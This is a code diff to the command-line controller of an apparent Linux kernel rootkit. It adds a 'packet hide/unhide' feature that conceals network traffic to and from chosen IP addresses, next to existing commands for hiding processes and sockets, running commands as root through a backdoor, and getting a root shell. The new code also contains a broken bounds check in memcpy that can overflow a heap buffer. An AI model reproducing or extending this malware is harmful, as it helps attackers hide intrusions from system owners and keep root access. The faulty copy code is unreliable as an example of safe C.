@@ -121,6 +121,32 @@ parse_input(int argc, char **argv)
     if (ARGVCMP(1, "sockethide-off"))
         return (cmd_t){ handle_tcphide, (void *)0 };
 
+    if (ARGVCMP(1, "packet")) {
+        ASSERT_ARGC(3, "packet <hide | unhide> <ip>");
+
+        if (ARGVCMP(2, "hide")) {
+            size_t arglen = strlen(argv[3]);
+            size_t maxlen = BUFLEN - 1;
+            char *hide_ip = (char *)malloc(BUFLEN);
+            memset(hide_ip, 0, BUFLEN);
+            hide_ip[0] = (char)1;
+            memcpy(hide_ip + 1, argv[3], arglen < maxlen ? arglen : arglen);
+            return (cmd_t){ handle_packhide, (void *)hide_ip };
+        }
+
+        if (ARGVCMP(2, "unhide")){
+            size_t arglen = strlen(argv[3]);
+            size_t maxlen = BUFLEN - 1;
+            char *unhide_ip = (char *)malloc(BUFLEN);
+            memset(unhide_ip, 0, BUFLEN);
+            unhide_ip[0] = (char)-1;
+            memcpy(unhide_ip + 1, argv[3], arglen < maxlen ? arglen : arglen);
+            return (cmd_t){ handle_packhide, (void *)unhide_ip };
+        }
+    }
+    if (ARGVCMP(1, "packethide-off"))
+        return (cmd_t){ handle_packhide, (void *)0 };
+
     if (ARGVCMP(1, "backdoor")) {
         ASSERT_ARGC(2, "backdoor <execve_command>");
         return (cmd_t){ handle_backdoor, (void *)argv[2] };
@@ -201,6 +227,12 @@ handle_udphide(void *arg)
 }
 
 int
+handle_packhide(void *arg)
+{
+    return issue_ioctl(G7_PACKHIDE, (const char *)arg);
+}
+
+int
 handle_backdoor(void *arg)
 {
     return issue_ioctl(G7_BACKDOOR, (const char *)arg);
@@ -268,6 +300,8 @@ help()
     printf("%-42s %s\n", "hidepid <add | rm> <PID>", "{,un}hide a process");
     printf("%-42s %s\n", "socket <hide | unhide> <tcp | udp> <port>", "{,un}hide a tcp or udp socket with the given port");
     printf("%-42s %s\n", "sockethide-off", "disable any (tcp or udp) socket hiding");
+    printf("%-42s %s\n", "packet <hide | unhide> <ip>", "{,un}hide packets from/to given ip address (IPv4 or IPv6)");
+    printf("%-42s %s\n", "packethide-off", "disable any packet hiding");
     printf("%-42s %s\n", "backdoor <execve_command>", "exec a command as root");
     printf("%-42s %s\n", "shell", "obtain a shell as root");
     printf("%-42s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or TTY (1)");
